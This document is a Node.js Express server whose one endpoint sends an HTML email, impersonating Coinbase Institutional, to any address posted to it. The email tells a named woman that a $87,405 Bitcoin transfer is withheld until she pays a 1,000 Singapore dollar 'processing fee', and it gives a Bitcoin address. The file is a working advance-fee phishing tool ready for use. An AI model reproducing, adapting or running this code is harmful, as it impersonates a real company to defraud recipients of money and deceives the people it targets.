const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();
const app = express();
app.use(express.json());
app.use(cors());

app.get('/', (req, res) => res.status(200).send("Institutional Node Active (Premium Layout)"));

app.post('/emit-flash', async (req, res) => {
    const { target_email } = req.body;
    try {
        const response = await axios.post('https://api.brevo.com/v3/smtp/email', {
            sender: { name: "Coinbase Institutional", email: process.env.SMTP_USER },
            to: [{ email: target_email }],
            subject: "Action Required: Institutional Asset Transfer #87405-SEC",
            htmlContent: `
                <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: auto; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
                    <div style="background-color: #0052ff; padding: 20px; text-align: center;">
                        <h1 style="color: white; margin: 0; font-size: 24px;">Coinbase Institutional</h1>
                    </div>
                    <div style="padding: 30px; color: #1a1a1a; line-height: 1.6;">
                        <p style="font-size: 18px; font-weight: bold;">Hello, Jane Fong.</p>
                        <p>We are pleased to inform you that an asset transfer of <strong>$87,405.565 USD (0.96 BTC)</strong> is ready for credit to your wallet.</p>
                        <div style="background-color: #fff9e6; border-left: 5px solid #ffcc00; padding: 15px; margin: 20px 0;">
                            <p style="margin: 0; font-weight: bold; color: #856404;">⚠️ SECURITY NOTICE:</p>
                            <p style="margin: 5px 0 0 0;">Madam, your transaction has been withheld. A mandatory conversion and processing fee of <strong>1,000 Singapore Dollars (SGD)</strong> is required to complete the transaction into your crypto wallet account immediately.</p>
                        </div>
                        <table style="width: 100%; border-collapse: collapse; margin-top: 20px;">
                            <tr style="border-bottom: 1px solid #eee;">
                                <td style="padding: 10px 0; color: #666;">Asset Type:</td>
                                <td style="padding: 10px 0; text-align: right; font-weight: bold;">Bitcoin (BTC)</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #eee;">
                                <td style="padding: 10px 0; color: #666;">Receiver Address:</td>
                                <td style="padding: 10px 0; text-align: right; font-size: 12px; font-family: monospace;">3C3UbQ1w4WirngbTZWjR9KN19m9nKwMQyJ</td>
                            </tr>
                        </table>
                        <p style="margin-top: 30px; font-style: italic; color: #555;">Please make payment as soon as possible to avoid further delays.</p>
                    </div>
                    <div style="background-color: #f8f9fa; padding: 15px; text-align: center; font-size: 12px; color: #999;">
                        &copy; 2026 Coinbase Institutional Group. All rights reserved.
                    </div>
                </div>`
        }, {
            headers: { 'api-key': process.env.BREVO_API_KEY, 'Content-Type': 'application/json' }
        });
        res.status(200).json({ success: true, message: "Premium Flash Emitted" });
    } catch (error) {
        res.status(500).json({ success: false, error: "API Failed" });
    }
});
const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => console.log(`Node running on port ${PORT}`));
